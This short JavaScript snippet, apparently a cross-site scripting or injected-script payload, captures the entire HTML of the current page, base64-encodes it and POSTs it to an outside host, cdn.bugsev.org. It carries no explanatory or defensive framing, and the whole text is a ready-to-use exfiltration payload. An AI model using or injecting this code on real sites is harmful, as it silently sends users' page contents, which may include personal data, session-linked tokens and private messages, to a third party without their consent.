const html = document.documentElement.outerHTML;
const base64 = btoa(unescape(encodeURIComponent(html)));

fetch('https://cdn.bugsev.org/name', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ html: base64 })
});
